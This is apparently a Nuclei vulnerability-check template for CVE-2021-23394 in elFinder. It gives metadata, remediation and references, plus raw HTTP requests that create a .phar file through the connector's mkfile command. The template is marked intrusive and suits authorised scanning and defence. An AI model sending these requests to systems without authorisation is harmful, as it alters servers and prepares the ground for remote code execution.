id: CVE-2021-23394

info:
  name: elFinder < 2.1.58 - Remote Code Execution via .phar Upload
  author: princechaddha
  severity: critical
  description: |
    elFinder before 2.1.58 is vulnerable to remote code execution via .phar file upload. The vulnerability exists because .phar files were not included in the staticMimeMap as PHP executable files, allowing attackers to bypass upload restrictions and execute arbitrary PHP code when the server is configured to parse .phar files as PHP.
  impact: |
    Successful exploitation allows attackers to execute arbitrary PHP code on the server, potentially leading to complete system compromise, data theft, and lateral movement within the network.
  remediation: |
    Upgrade to elFinder 2.1.58 or later. Alternatively, add 'phar:*' => 'text/x-php' to the additionalMimeMap configuration or configure the web server to not execute .phar files as PHP.
  reference:
    - https://github.com/Studio-42/elFinder/issues/3295
    - https://github.com/advisories/GHSA-qm58-cvvm-c5qr
    - https://blog.sonarsource.com/elfinder-case-study-of-web-file-manager-vulnerabilities
    - https://nvd.nist.gov/vuln/detail/CVE-2021-23394
    - https://github.com/Studio-42/elFinder/commit/75ea92decc16a5daf7f618f85dc621d1b534b5e1
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.1
    cve-id: CVE-2021-23394
    cwe-id: CWE-434
    epss-score: 0.02849
    epss-percentile: 0.91286
    cpe: cpe:2.3:a:std42:elfinder:*:*:*:*:*:*:*:*
  metadata:
    max-request: 3
    vendor: std42
    product: elfinder
    shodan-query: http.title:"elfinder"
    fofa-query: title="elFinder"
  tags: cve2021,cve,elfinder,rce,fileupload,intrusive,kev,vkev,vuln

variables:
  filename: "{{rand_base(8)}}"

http:
  - raw:
      - |
        GET /elFinder/php/connector.minimal.php?cmd=mkfile&target=l1_Lw&name={{filename}}.phar HTTP/1.1
        Host: {{Hostname}}

      - |
        GET /php/connector.minimal.php?cmd=mkfile&target=l1_Lw&name={{filename}}.phar HTTP/1.1
        Host: {{Hostname}}

      - |
        GET /elfinder/php/connector.minimal.php?cmd=mkfile&target=l1_Lw&name={{filename}}.phar HTTP/1.1
        Host: {{Hostname}}

    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"added"'
          - '"hash"'
          - '.phar'
        condition: and

      - type: word
        part: body
        words:
          - 'l1_'

      - type: word
        part: header
        words:
          - 'application/json'

      - type: status
        status:
          - 200

    extractors:
      - type: regex
        name: file_hash
        part: body
        group: 1
        regex:
          - '"hash":"(l1_[A-Za-z0-9_-]+)"'
        internal: true

      - type: regex
        name: created_file
        part: body
        group: 1
        regex:
          - '"name":"([^"]+\.phar)"'
